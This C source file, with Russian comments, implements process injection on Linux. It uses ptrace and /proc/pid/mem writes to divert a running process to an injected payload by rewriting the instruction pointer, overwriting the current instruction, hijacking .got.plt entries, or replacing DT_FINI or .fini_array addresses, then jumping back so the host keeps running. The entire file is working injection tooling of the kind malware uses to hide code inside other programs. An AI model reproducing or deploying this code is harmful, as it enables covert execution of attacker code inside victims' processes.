#include <sys/ptrace.h>
#include <sys/user.h>

#include "common.h"
int get_dynamic(struct Process_info *pi);

// Функция вставки перехода адрес
// IN jmp_value - адрес строки байт (разница адресов)
// IN inject_addr - адрес вставки инструкции jmp
// IN *pi - адрес структуры 
int inject_jmp32(uint32_t jmp_value, uint32_t inject_addr, struct Process_info *pi) {
    uint8_t jmp[5] = {0xe9};                                // jmp ...                  - разница адресов

    // Заполнение инструкции
    jmp[1] = jmp_value & 0xff;
    jmp[2] = (jmp_value >> 8) & 0xff;
    jmp[3] = (jmp_value >> 16) & 0xff;
    jmp[4] = (jmp_value >> 24) & 0xff;

    // Вставка инструкции
    if (pwrite(pi->mem_fd, jmp, sizeof(jmp), inject_addr) == -1) {
        perror("    [!] inject_jmp32: pwrite: jmp");
        return 1;
    }

    return 0;
}

// Функция вставки перехода адрес
// IN to_addr - адрес назначения
// IN inject_addr - адрес вставки инструкции
// IN *pi - адрес структуры 
int inject_jmp64(uint64_t to_addr, uint64_t inject_addr, struct Process_info *pi) {
    uint8_t jmp[0x14] = {
        0x48, 0x83, 0xec, 0x08,                             // sub rsp, 0x08
        0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00,     // mov [rsp + 0x04], ...    - первые 4 байта адреса
        0xc7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00,           // mov [rsp], ...           - последние 4 байта адреса
        0xc3};                                              // ret

    // Заполнение инструкции
    jmp[15] = to_addr & 0xff;
    jmp[16] = (to_addr >> 8) & 0xff;
    jmp[17] = (to_addr >> 16) & 0xff;
    jmp[18] = (to_addr >> 24) & 0xff;

    jmp[8] = (to_addr >> 32) & 0xff;
    jmp[9] = (to_addr >> 40) & 0xff;
    jmp[10] = (to_addr >> 48) & 0xff;
    jmp[11] = (to_addr >> 56) & 0xff;

    // Вставка инструкции
    if (pwrite(pi->mem_fd, jmp, sizeof(jmp), inject_addr) == -1) {
        perror("    [!] inject_jmp64: pwrite: jmp");
        return 1;
    }

    return 0;
}

// Функция изменение регистра ip
// IN *pi - адрес структуры 
void p_m_ip(struct Process_info *pi) {
    struct user_regs_struct regs;
    
    // Подключаемся к процессу
    if (ptrace(PTRACE_ATTACH, pi->pid, NULL, NULL) == -1) {
        perror("    [!] p_m_ip: ptrace: PTRACE_ATTACH.");
        return;
    }

    // Получаем значения регистров
    if (ptrace(PTRACE_GETREGS, pi->pid, NULL, &regs) == -1) {
        perror("    [!] p_m_ip: ptrace: PTRACE_GETREGS.");
        return;
    }

    if (pi->ei_class == 0x01){ 
        pi->fi32.orig_vaddr = regs.rip;

        if (pi->pic) {
            // Изменяем ip на адрес своей нагрзуки
            regs.rip = pi->process_addr + pi->fi32.addr_free + 2;

            // Вставляем в конец нагрузки переход на оригинальный ip
            if (inject_jmp32(
                pi->fi32.orig_vaddr - (pi->process_addr + pi->fi32.addr_free + pi->payload_size + 0x05),
                pi->process_addr + pi->fi32.addr_free + pi->payload_size,
                pi)) {
                return;
            }

        } else {
            // Изменяем ip на адрес своей нагрзуки
            regs.rip = pi->fi32.addr_free + 2;

            // Вставляем в конец нагрузки переход на оригинальный ip
            if (inject_jmp32(
                pi->fi32.orig_vaddr - (pi->fi32.addr_free + pi->payload_size + 0x05),
                pi->fi32.addr_free + pi->payload_size,
                pi)) {
                return;
            }
        }

    } else {
        pi->fi64.orig_vaddr = regs.rip;

        if (pi->pic) {
            // Изменяем ip на адрес своей нагрзуки
            regs.rip = pi->process_addr + pi->fi64.addr_free + 2;

            // Вставляем в конец нагрузки переход на оригинальный ip
            if (inject_jmp64(
                pi->fi64.orig_vaddr,
                pi->process_addr + pi->fi64.addr_free + pi->payload_size,
                pi)) {
                return;
            }
        } else {
            // Изменяем ip на адрес своей нагрзуки
            regs.rip = pi->fi64.addr_free + 2;

            // Вставляем в конец нагрузки переход на оригинальный ip
            if (inject_jmp64(
                pi->fi64.orig_vaddr,
                pi->fi64.addr_free + pi->payload_size,
                pi)) {
                return;
            }
        }
        
    }

    // Сохраняем регистры
    if (ptrace(PTRACE_SETREGS, pi->pid, NULL, &regs) == -1) {
        perror("    [!] p_m_ip: ptrace: PTRACE_SETREGS.");
        return;
    }

    // Отключаемся от процесса
    if (ptrace(PTRACE_DETACH, pi->pid, NULL, NULL) == -1) {
        perror("    [!] p_m_ip: ptrace: PTRACE_DETACH.");
        return;
    }

    printf("    [+] Инъекция прошла успешно.\n\n");
}

// Функция изменение текущей инструкции
// IN *pi - адрес структуры 
void p_m_cur_inst(struct Process_info *pi){
    FILE *file;
    char line[1024];
    char file_path[256];
    snprintf(file_path, sizeof(file_path), "/proc/%d/syscall", pi->pid);

    // Открываем файл
    file = fopen(file_path, "r");
    if (file == NULL) {
        perror("    [!] p_m_cur_inst: fopen: <file_path>.");
        return;
    }

    // Считываем строку
    if (fgets(line, sizeof(line), file) != NULL) {
        char *last_value;
        char *token = strtok(line, " ");
        
        // Перебираем все значения в строке
        while (token != NULL) {
            last_value = token;                             // Сохраняем последнее значение
            token = strtok(NULL, " ");
        }
        
        if (pi->ei_class == 0x01){
            pi->fi32.orig_vaddr = (uint32_t)strtoul(last_value, NULL, 16);

            if (pi->pic) {
                // Заменяем текующую инструкцию переходом на нагрузку
                if (inject_jmp32(
                    pi->process_addr + pi->fi32.addr_free - (pi->fi32.orig_vaddr + 0x05),
                    pi->fi32.orig_vaddr,
                    pi)) {
                    return;
                }

                // Вставляем в конец нагрузки переход на адрес инстукции (произойдет зацикливание)
                if (inject_jmp32(
                    pi->fi32.orig_vaddr - (pi->process_addr + pi->fi32.addr_free + pi->payload_size + 0x05),
                    pi->process_addr + pi->fi32.addr_free + pi->payload_size,
                    pi)) {
                    return;
                }
            } else {
                // Заменяем текующую инструкцию переходом на нагрузку
                if (inject_jmp32(
                    pi->fi32.addr_free - (pi->fi32.orig_vaddr + 0x05),
                    pi->fi32.orig_vaddr,
                    pi)) {
                    return;
                }

                // Вставляем в конец нагрузки переход на адрес инстукции (произойдет зацикливание)
                if (inject_jmp32(
                    pi->fi32.orig_vaddr - (pi->fi32.addr_free + pi->payload_size + 0x05),
                    pi->fi32.addr_free + pi->payload_size,
                    pi)) {
                    return;
                }
            }
            
          
        } else {
            pi->fi64.orig_vaddr = (uint64_t)strtoul(last_value, NULL, 16);

            if (pi->pic) {
                // Заменяем текующую инструкцию переходом на нагрузку
                if (inject_jmp64(
                    pi->process_addr + pi->fi64.addr_free,
                    pi->fi64.orig_vaddr,
                    pi)) {
                    return;
                }

                // Вставляем в конец нагрузки переход на адрес инстукции (произойдет зацикливание)
                if (inject_jmp64(
                    pi->fi64.orig_vaddr,
                    pi->process_addr + pi->fi64.addr_free + pi->payload_size,
                    pi)) {
                    return;
                }
            } else {
                // Заменяем текующую инструкцию переходом на нагрузку
                if (inject_jmp64(
                    pi->fi64.addr_free,
                    pi->fi64.orig_vaddr,
                    pi)) {
                    return;
                }

                // Вставляем в конец нагрузки переход на адрес инстукции (произойдет зацикливание)
                if (inject_jmp64(
                    pi->fi64.orig_vaddr,
                    pi->fi64.addr_free + pi->payload_size,
                    pi)) {
                    return;
                }
            }
            
        }
        
    } else if (ferror(file)) {
        printf("    [!] Ошибка чтения из файла.\n");
    }

    // Закрываем файл
    fclose(file);
    printf("    [+] Инъекция прошла успешно.\n");
}

// Функция изменение адреса функции в секции .got.plt
// IN *pi - адрес структуры 
void p_m_got_plt(struct Process_info *pi) {
    if (pi->pic) {
        // Получаем характеристику сегмента dynamic
        if (get_dynamic(pi)) {
            return;
        }

        if (pi->ei_class == 0x01) {
            uint32_t type;
            for (int i = 0; i*0x08 < pi->fi32.dynamic_memsz; i++){
                // Читаем тип записи в сегменте dynamic
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08) == -1) {
                    perror("    [!] p_m_got_plt: pread: type");
                    return;
                }

                if (type == 0x03) {
                    // Сохраняем адрес .got.plt
                    uint32_t got_plt_addr;
                    if (pread(pi->mem_fd, &got_plt_addr, sizeof(got_plt_addr), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08 + 0x04) == -1) {
                        perror("    [!] p_m_got_plt: pread: got_plt_addr");
                        return;
                    }
                    
                    // Сохраняем адрес первой функции
                    if (pread(pi->mem_fd, &pi->fi32.orig_vaddr, sizeof(pi->fi32.orig_vaddr), got_plt_addr + 4 * 0x04) == -1) {
                        perror("    [!] p_m_got_plt: pread: pi->fi32.orig_vaddr");
                        return;
                    }

                    // Генерируем адрес
                    unsigned char addr[4];
                    addr[0] = (pi->process_addr + pi->fi32.addr_free >> 0) & 0xff;
                    addr[1] = (pi->process_addr + pi->fi32.addr_free >> 8) & 0xff;
                    addr[2] = (pi->process_addr + pi->fi32.addr_free >> 16) & 0xff;
                    addr[3] = (pi->process_addr + pi->fi32.addr_free >> 24) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), got_plt_addr + 4 * 0x04) == -1) {
                        perror("    [!] p_m_got_plt: pwrite: addr");
                        return;
                    }

                    // Вставляем в конец нагрузки переход на адрес функции
                    if (inject_jmp32(
                        pi->fi32.orig_vaddr - (pi->process_addr + pi->fi32.addr_free + pi->payload_size + 0x05),
                        pi->process_addr + pi->fi32.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                
                }
            }
            
        } else {
            uint64_t type;
            for (int i = 0; i*0x08 < pi->fi64.dynamic_memsz; i++){
                // Читаем тип записи в сегменте dynamic
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10) == -1) {
                    perror("    [!] p_m_got_plt: pread: type");
                    return;
                }

                if (type == 0x03) {
                    // Сохраняем адрес .got.plt
                    uint64_t got_plt_addr;
                    if (pread(pi->mem_fd, &got_plt_addr, sizeof(got_plt_addr), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10 + 0x08) == -1) {
                        perror("    [!] p_m_got_plt: pread: got_plt_addr");
                        return;
                    }

                    // Сохраняем адрес первой функции
                    if (pread(pi->mem_fd, &pi->fi64.orig_vaddr, sizeof(pi->fi64.orig_vaddr), got_plt_addr + 3 * 0x08) == -1) {
                        perror("    [!] p_m_got_plt: pread: pi->fi64.orig_vaddr");
                        return;
                    }
                    
                    // Генерируем адрес
                    unsigned char addr[8];
                    addr[0] = (pi->process_addr + pi->fi64.addr_free >> 0) & 0xff;
                    addr[1] = (pi->process_addr + pi->fi64.addr_free >> 8) & 0xff;
                    addr[2] = (pi->process_addr + pi->fi64.addr_free >> 16) & 0xff;
                    addr[3] = (pi->process_addr + pi->fi64.addr_free >> 24) & 0xff;
                    addr[4] = (pi->process_addr + pi->fi64.addr_free >> 32) & 0xff;
                    addr[5] = (pi->process_addr + pi->fi64.addr_free >> 40) & 0xff;
                    addr[6] = (pi->process_addr + pi->fi64.addr_free >> 48) & 0xff;
                    addr[7] = (pi->process_addr + pi->fi64.addr_free >> 56) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), got_plt_addr + 3 * 0x08) == -1) {
                        perror("    [!] p_m_got_plt: pwrite: addr");
                        return;
                    }

                    // Вставляем в конец нагрузки переход на адрес функции
                    if (inject_jmp64(
                        pi->fi64.orig_vaddr,
                        pi->process_addr + pi->fi64.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                

                }
            }
        }
        printf("    [+] Инъекция прошла успешно.\n");
    } else {
        printf("    [!] Тип файла не поддерживает данный метод\n");
    }
}

// Функция изменение адреса .fini
// IN *pi - адрес структуры 
void p_m_fini(struct Process_info *pi) {
    if (pi->pic) {
        // Получаем характеристику сегмента dynamic
        if (get_dynamic(pi)) {
            return;
        }

        if (pi->ei_class == 0x01) {
            uint32_t type;
            for (int i = 0; i*0x08 < pi->fi32.dynamic_memsz; i++){
                // Читаем тип записи в сегменте dynamic
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08) == -1) {
                    perror("    [!] p_m_fini: pread: type");
                    return;
                }

                if (type == 0x0d) {
                    // Сохраняем оригинальный адрес
                    if (pread(pi->mem_fd, &pi->fi32.orig_vaddr, sizeof(pi->fi32.orig_vaddr), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08 + 0x04) == -1) {
                        perror("    [!] p_m_fini: pread: pi->fi32.orig_vaddr");
                        return;
                    }
                    
                    // Генерируем адрес
                    unsigned char addr[4];
                    addr[0] = (pi->fi32.addr_free >> 0) & 0xff;
                    addr[1] = (pi->fi32.addr_free >> 8) & 0xff;
                    addr[2] = (pi->fi32.addr_free >> 16) & 0xff;
                    addr[3] = (pi->fi32.addr_free >> 24) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08 + 0x04) == -1) {
                        perror("    [!] p_m_fini: pwrite: addr");
                        return;
                    }

                    // Вставляем в конец нагрузки переход на оригинальный адрес
                    if (inject_jmp32(
                        pi->fi32.orig_vaddr + pi->process_addr - (pi->process_addr + pi->fi32.addr_free + pi->payload_size + 0x05),
                        pi->process_addr + pi->fi32.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                
                }
            }
            
        } else {
            uint64_t type;
            for (int i = 0; i*0x08 < pi->fi64.dynamic_memsz; i++){
                // Читаем тип записи в сегменте dynamic
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10) == -1) {
                    perror("    [!] p_m_fini: pread: type");
                    return;
                }

                if (type == 0x0d) {
                    // Сохраняем оригинальный адрес
                    if (pread(pi->mem_fd, &pi->fi64.orig_vaddr, sizeof(pi->fi64.orig_vaddr), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10 + 0x08) == -1) {
                        perror("    [!] p_m_fini: pread: pi->fi64.orig_vaddr");
                        return;
                    }
                    
                    // Генерируем адрес
                    unsigned char addr[8];
                    addr[0] = (pi->fi64.addr_free >> 0) & 0xff;
                    addr[1] = (pi->fi64.addr_free >> 8) & 0xff;
                    addr[2] = (pi->fi64.addr_free >> 16) & 0xff;
                    addr[3] = (pi->fi64.addr_free >> 24) & 0xff;
                    addr[4] = (pi->fi64.addr_free >> 32) & 0xff;
                    addr[5] = (pi->fi64.addr_free >> 40) & 0xff;
                    addr[6] = (pi->fi64.addr_free >> 48) & 0xff;
                    addr[7] = (pi->fi64.addr_free >> 56) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10 + 0x08) == -1) {
                        perror("    [!] p_m_fini: pwrite: addr");
                        return;
                    }

                    // Вставляем в конец нагрузки переход на оригинальный адрес
                    if (inject_jmp64(
                        pi->fi64.orig_vaddr + pi->process_addr,
                        pi->process_addr + pi->fi64.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                

                }
            }
        }
        printf("    [+] Инъекция прошла успешно.\n");
    } else {
        printf("    [!] Тип файла не поддерживает данный метод\n");
    }
}

// Функция изменение первого адреса в массиве .fini_array
// IN *pi - адрес структуры 
void p_m_fini_array(struct Process_info *pi) {
    if (pi->pic) {
        // Получаем характеристику сегмента dynamic
        if (get_dynamic(pi)) {
            return;
        }

        if (pi->ei_class == 0x01) {
            uint32_t type;
            for (int i = 0; i*0x08 < pi->fi32.dynamic_memsz; i++){
                // Читаем тип записи в сегменте dynamic
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08) == -1) {
                    perror("    [!] p_m_fini_array: pread: type");
                    return;
                }

                if (type == 0x1a) {
                    // Сохраняем адрес fini_array
                    uint32_t fini_array_addr;
                    if (pread(pi->mem_fd, &fini_array_addr, sizeof(fini_array_addr), pi->process_addr + pi->fi32.dynamic_vaddr + i*0x08 + 0x04) == -1) {
                        perror("    [!] p_m_fini_array: pread: fini_array_addr");
                        return;
                    }

                    // Сохраняем адрес первого элемента массива
                    if (pread(pi->mem_fd, &pi->fi32.orig_vaddr, sizeof(pi->fi32.orig_vaddr), pi->process_addr + fini_array_addr) == -1) {
                        perror("    [!] p_m_fini_array: pread: pi->fi32.orig_vaddr");
                        return;
                    }
                    
                    // Генерируем адрес
                    unsigned char addr[4];
                    addr[0] = (pi->process_addr + pi->fi32.addr_free >> 0) & 0xff;
                    addr[1] = (pi->process_addr + pi->fi32.addr_free >> 8) & 0xff;
                    addr[2] = (pi->process_addr + pi->fi32.addr_free >> 16) & 0xff;
                    addr[3] = (pi->process_addr + pi->fi32.addr_free >> 24) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), pi->process_addr + fini_array_addr) == -1) {
                        perror("    [!] p_m_fini: pwrite: addr");
                        return;
                    }

                    // Вставляем в конец нагрузки переход на оригинальный адрес
                    if (inject_jmp32(
                        pi->fi32.orig_vaddr - (pi->process_addr + pi->fi32.addr_free + pi->payload_size + 0x05),
                        pi->process_addr + pi->fi32.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                
                }
            }
            
        } else {
            uint64_t type;
            for (int i = 0; i*0x08 < pi->fi64.dynamic_memsz; i++){
                if (pread(pi->mem_fd, &type, sizeof(type), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10) == -1) {
                    perror("    [!] p_m_fini_array: pread: type");
                    return;
                }

                if (type == 0x1a) {
                    // Сохраняем адрес fini_array
                    uint64_t fini_array_addr;
                    if (pread(pi->mem_fd, &fini_array_addr, sizeof(fini_array_addr), pi->process_addr + pi->fi64.dynamic_vaddr + i*0x10 + 0x08) == -1) {
                        perror("    [!] p_m_fini_array: pread: fini_array_addr");
                        return;
                    }

                    // Сохраняем адрес первого элемента массива
                    if (pread(pi->mem_fd, &pi->fi64.orig_vaddr, sizeof(pi->fi64.orig_vaddr), pi->process_addr + fini_array_addr) == -1) {
                        perror("    [!] p_m_fini_array: pread: pi->fi64.orig_vaddr");
                        return;
                    }
                    
                    // Генерируем адрес
                    unsigned char addr[8];
                    addr[0] = (pi->process_addr + pi->fi64.addr_free >> 0) & 0xff;
                    addr[1] = (pi->process_addr + pi->fi64.addr_free >> 8) & 0xff;
                    addr[2] = (pi->process_addr + pi->fi64.addr_free >> 16) & 0xff;
                    addr[3] = (pi->process_addr + pi->fi64.addr_free >> 24) & 0xff;
                    addr[4] = (pi->process_addr + pi->fi64.addr_free >> 32) & 0xff;
                    addr[5] = (pi->process_addr + pi->fi64.addr_free >> 40) & 0xff;
                    addr[6] = (pi->process_addr + pi->fi64.addr_free >> 48) & 0xff;
                    addr[7] = (pi->process_addr + pi->fi64.addr_free >> 56) & 0xff;

                    // Заменяем адрес на адрес нагрузки
                    if (pwrite(pi->mem_fd, addr, sizeof(addr), pi->process_addr + fini_array_addr) == -1) {
                        perror("    [!] p_m_fini: pwrite: addr");
                        return;
                    }

                    // прыжок на оригинал
                    if (inject_jmp64(
                        pi->fi64.orig_vaddr,
                        pi->process_addr + pi->fi64.addr_free + pi->payload_size,
                        pi)) {
                        return;
                    }                

                }
            }
        }
        printf("    [+] Инъекция прошла успешно.\n");
    } else {
        printf("    [!] Тип файла не поддерживает данный метод\n");
    }
}

// Функция получения адреса и размера сегмента dynamic
// IN *pi - адрес стурктуры
// OUT pi->fi32/64.dynamic_vaddr - RVA сегмента dynamic
// OUT pi->fi32/64.dynamic_memsz - размер сегмента
int get_dynamic(struct Process_info *pi) {
    for (int i = 0; i < pi->e_phnum; i++) {
        if (pi->ei_class == 0x01) {
            uint32_t p_type;
            // Читаем тип сегмента
            if (pread(pi->mem_fd, &p_type, sizeof(p_type), pi->process_addr + pi->fi32.e_phoff + i*pi->e_phentsize) == -1) {
                perror("    [!] get_dynamic: pread: p_type");
                return 1;
            }
            
            if (p_type == 0x02) {
                // Читаем RVA сегмента dynamic
                if (pread(pi->mem_fd, &pi->fi32.dynamic_vaddr, sizeof(pi->fi32.dynamic_vaddr), pi->process_addr + pi->fi32.e_phoff + i*pi->e_phentsize + 0x08) == -1) {
                    perror("    [!] get_dynamic: pread: pi->fi32.dynamic_vaddr");
                    return 1;
                }
                // Читаем размер сегмента
                if (pread(pi->mem_fd, &pi->fi32.dynamic_memsz, sizeof(pi->fi32.dynamic_memsz), pi->process_addr + pi->fi32.e_phoff + i*pi->e_phentsize + 0x14) == -1) {
                    perror("    [!] get_dynamic: pread: pi->fi32.dynamic_memsz");
                    return 1;
                }

                return 0;
            }
        } else {
            uint32_t p_type;
            // Читаем тип сегмента
            if (pread(pi->mem_fd, &p_type, sizeof(p_type), pi->process_addr + pi->fi32.e_phoff + i*pi->e_phentsize) == -1) {
                perror("    [!] get_dynamic: pread: p_type");
                return 1;
            }

            if (p_type == 0x02) {
                // Читаем RVA сегмента dynamic
                if (pread(pi->mem_fd, &pi->fi64.dynamic_vaddr, sizeof(pi->fi64.dynamic_vaddr), pi->process_addr + pi->fi64.e_phoff + i*pi->e_phentsize + 0x10) == -1) {
                    perror("    [!] get_dynamic: pread: pi->fi64.dynamic_vaddr");
                    return 1;
                }
                // Читаем размер сегмента
                if (pread(pi->mem_fd, &pi->fi64.dynamic_memsz, sizeof(pi->fi64.dynamic_memsz), pi->process_addr + pi->fi64.e_phoff + i*pi->e_phentsize + 0x20) == -1) {
                    perror("    [!] get_dynamic: pread: pi->fi64.dynamic_memsz");
                    return 1;
                }

                return 0;
            }
        }
    }

    return 1;
}
